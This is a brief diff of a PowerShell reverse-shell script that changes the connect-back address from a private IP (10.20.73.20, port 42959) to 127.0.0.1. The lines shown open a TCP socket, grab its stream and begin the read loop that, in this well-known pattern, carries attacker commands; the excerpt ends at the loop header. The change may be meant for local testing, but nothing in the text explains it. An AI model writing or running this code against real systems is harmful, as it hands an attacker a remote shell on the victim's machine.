@@ -1,4 +1,4 @@
-$client = New-Object System.Net.Sockets.TCPClient("10.20.73.20", 42959);
+$client = New-Object System.Net.Sockets.TCPClient("127.0.0.1", 42959);
 $stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{0};
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
